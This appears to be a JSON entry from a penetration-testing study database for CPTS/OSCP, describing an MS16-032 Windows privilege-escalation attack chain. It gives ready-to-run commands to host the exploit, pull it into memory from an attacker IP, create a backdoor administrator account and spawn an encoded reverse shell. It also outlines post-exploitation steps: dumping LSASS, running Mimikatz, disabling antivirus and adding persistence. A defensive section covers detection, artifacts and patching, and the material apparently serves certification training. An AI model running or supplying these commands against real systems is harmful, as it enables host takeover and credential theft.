@@ -1,0 +1,117 @@
+{
+  "type": "attack-chain",
+  "platform": "windows",
+  "requires": [
+    "local-access"
+  ],
+  "protocols": [],
+  "tools": [
+    "powershell"
+  ],
+  "tags": [
+    "attack-chain",
+    "ms16-032",
+    "kernel"
+  ],
+  "category": "Privilege Escalation",
+  "subcategory": "Windows - Attack Chains",
+  "certifications": [
+    "CPTS",
+    "OSCP"
+  ],
+  "primary_cert": "CPTS",
+  "source": "CPTS Module 26: Windows Privilege Escalation",
+  "examples": [
+    {
+      "label": "Host the exploit on Kali",
+      "command": "wget https://raw.githubusercontent.com/FuzzySecurity/PowerShell-Suite/master/Invoke-MS16-032.ps1; python3 -m http.server 80"
+    },
+    {
+      "label": "Download + run in-memory to add a local admin",
+      "command": "IEX (New-Object Net.WebClient).DownloadString('http://<lhost>/Invoke-MS16-032.ps1'); Invoke-MS16-032 -Command \"net user hacker P@ssw0rd! /add && net localgroup administrators hacker /add\""
+    },
+    {
+      "label": "Read the flag as the new admin",
+      "command": "runas /user:hacker \"cmd /c type C:\\Users\\Administrator\\Desktop\\flag.txt\""
+    }
+  ],
+  "notes": "=== Attack Chain: MS16-032 Secondary Logon → SYSTEM ===\nFull chain using MS16-032 race condition in Secondary Logon service for privilege escalation.\n\n=== CHAIN OVERVIEW ===\nFoothold (any low-priv shell) → Confirm prerequisites → MS16-032 → SYSTEM → Post-exploitation\n\n=== PREREQUISITE VERIFICATION ===\n1. Multi-processor system (race condition requires >1 CPU):\n   Get-WmiObject Win32_Processor | Select NumberOfCores,NumberOfLogicalProcessors\n   Must have multiple logical processors — single-core VMs won't work reliably\n\n2. Secondary Logon service running:\n   sc query seclogon | findstr STATE\n   Get-Service seclogon | Select Status\n   Must be Running (not Stopped/Disabled)\n\n3. Missing patch:\n   wmic qfe list | findstr 3143141\n   If absent → system may be vulnerable\n   Watson: .\\Watson.exe → automatically flags this\n\n=== EXECUTION ===\nMethod 1 - IEX (fileless, no disk write):\n  IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/Invoke-MS16-032.ps1')\n  Invoke-MS16-032\n\nMethod 2 - Traditional import:\n  Import-Module .\\Invoke-MS16-032.ps1\n  Invoke-MS16-032\n\nResult: Spawns cmd.exe as NT AUTHORITY\\SYSTEM in new window\nModify script to run reverse shell command instead of cmd.exe for non-GUI contexts\n\n=== POST-EXPLOITATION CHAIN ===\nSYSTEM → LSASS dump → transfer → Mimikatz → domain credentials\nSYSTEM → secretsdump local → local admin hashes → lateral movement\nSYSTEM → add persistence (new admin user, scheduled task, registry run key)\nSYSTEM → disable AV → stage additional tools → deeper enumeration\n\n=== COMMON FAILURE MODES ===\nRace condition: may need multiple attempts (run 3-5 times if first attempt fails)\nSingle-core: won't work — verify processor count first\nPatched: KB3143141 present → try other exploit paths (HiveNightmare, PrintNightmare, AlwaysInstallElevated)\nPowerShell restricted: use IEX download cradle or compile to binary\n\n=== CHAINING CONTEXT ===\nInitial foothold (web shell, RCE, phishing) → MS16-032 → SYSTEM\nSYSTEM → secretsdump → NTLM hashes → crackmapexec sweep → lateral movement\nMS16-032 → SYSTEM → domain escalation when combined with Kerberoasting/ASREP results\nBackup path when Potato attacks are patched (no SeImpersonate) and no kernel CVEs are available",
+  "references": [
+    {
+      "title": "Invoke-MS16-032 (FuzzySecurity)",
+      "url": "https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Invoke-MS16-032.ps1"
+    },
+    {
+      "title": "HTB Academy - Windows Privilege Escalation",
+      "url": "https://academy.hackthebox.com/module/details/67"
+    },
+    {
+      "title": "OffSec PEN-200 (OSCP)",
+      "url": "https://www.offsec.com/courses/pen-200/"
+    }
+  ],
+  "recommended": [
+    {
+      "id": "ms16-032",
+      "note": "The condensed card form of this exploit.",
+      "rel": "alternative"
+    },
+    {
+      "id": "legacy-os-exploits",
+      "note": "Other options on older unpatched hosts.",
+      "rel": "alternative"
+    },
+    {
+      "id": "chain-pillaging-to-system",
+      "rel": "next",
+      "note": "Continue enumeration/technique in this area"
+    }
+  ],
+  "id": "chain-ms16-032",
+  "name": "Attack Chain - MS16-032 Local Admin",
+  "command": "# host Invoke-MS16-032.ps1, load it in-memory, run it to add a local admin",
+  "description": "End-to-end MS16-032 chain: stage the exploit on your host, pull it into memory on target (no disk write), run it to add an administrator, then verify - the full context, in order.",
+  "steps": [
+    {
+      "label": "1. Host the exploit (attacker/Kali)",
+      "command": "wget https://raw.githubusercontent.com/FuzzySecurity/PowerShell-Suite/master/Invoke-MS16-032.ps1\npython3 -m http.server 80"
+    },
+    {
+      "label": "2. Load in memory (target)",
+      "command": "IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.3/Invoke-MS16-032.ps1')"
+    },
+    {
+      "label": "3. Run - add local admin (target)",
+      "command": "Invoke-MS16-032 -Command \"net user hacker P@ssw0rd! /add && net localgroup administrators hacker /add\""
+    },
+    {
+      "label": "4. Verify (target)",
+      "command": "net user hacker\nnet localgroup administrators"
+    },
+    {
+      "label": "Alt: reverse shell as SYSTEM",
+      "command": "Invoke-MS16-032 -Command \"powershell -NoP -NonI -W Hidden -Exec Bypass -Enc <base64_revshell>\""
+    }
+  ],
+  "opsec": "loud",
+  "mitre": [
+    "T1068"
+  ],
+  "exam": "exam-ok",
+  "defense": {
+    "why_it_works": "MS16-032 abuses a race condition in the Windows Secondary Logon (seclogon) service: it fails to properly sanitize thread handles, letting a low-privileged user duplicate a SYSTEM token onto a thread they control. Reliable on unpatched Win7-10 / Server 2008-2012 with 2+ CPU cores.",
+    "prerequisites": "A foothold as a low-privileged user on a host missing the MS16-032 patch, with 2+ CPU cores, and PowerShell available.",
+    "impact": "Local privilege escalation to SYSTEM — enough to add a local administrator account or spawn a SYSTEM-level shell, fully controlling the host.",
+    "detection": "[MITRE T1068 AN1419] Detects exploitation attempts targeting vulnerable OS components, often followed by unusual process or token behavior. Watch for a low-privileged process spawning a SYSTEM child, and for in-memory PowerShell download-and-execute (IEX (New-Object Net.WebClient).DownloadString). PowerShell script-block logging (Event 4104) captures Invoke-MS16-032.",
+    "artifacts": "A new local admin account and its Event 4720 (account created) / 4732 (added to Administrators); PowerShell IEX in-memory execution; a SYSTEM process parented by a user process; encoded-command (-Enc) PowerShell if the reverse-shell path is used.",
+    "prevention": "Apply the MS16-032 security update (the definitive fix). [MITRE T1068 M1051 Update Software] keep systems patched; [M1038 Execution Prevention] and [M1048 Application Isolation and Sandboxing] limit exploit impact; use application control (WDAC/AppLocker) to block unauthorized PowerShell tooling.",
+    "evasion": "The PoC runs entirely in memory (IEX DownloadString) to avoid writing to disk and dodge on-disk AV; the reverse-shell variant uses an encoded (-Enc) command to obscure the payload.",
+    "sources": [
+      "HTB M26",
+      "MITRE T1068"
+    ],
+    "misconfiguration": "Windows systems accumulate privilege escalation paths over time: scheduled tasks running as SYSTEM with world-writable scripts, service binaries with weak DACL (non-admins can overwrite), AlwaysInstallElevated enabled (any MSI installs as SYSTEM), or SeImpersonatePrivilege granted to web/service accounts.",
+    "vulnerable_config": "# AlwaysInstallElevated (any user installs MSI as SYSTEM):\nreg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated\nreg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated\n# Both = 1  ->  msfvenom -p windows/exec CMD=calc.exe -f msi > priv.msi; msiexec /quiet /i priv.msi\n\n# Service binary with weak DACL:\nicacls C:\\Program Files\\VulnSvc\\svc.exe\n# BUILTIN\\Users:(F)  <-- any user has Full Control -> replace with malicious binary",
+    "secure_config": "# Disable AlwaysInstallElevated:\n# GPO: Computer Config > Admin Templates > Windows Components > Windows Installer\n#   'Always install with elevated privileges' = Disabled\n# Registry (both keys required):\nSet-ItemProperty -Path 'HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer' -Name AlwaysInstallElevated -Value 0\nSet-ItemProperty -Path 'HKCU:\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer' -Name AlwaysInstallElevated -Value 0\n\n# Fix service binary DACLs:\nicacls 'C:\\Program Files\\VulnSvc\\svc.exe' /inheritance:r /grant:r 'NT AUTHORITY\\SYSTEM:(F)' 'BUILTIN\\Administrators:(F)'\n# Remove all non-admin write permissions\n\n# Audit with PowerUp or PrivescCheck:\n# Invoke-PrivescCheck -Thorough  # comprehensive privesc surface audit\n# Run monthly and after any software installation"
+  }
+}
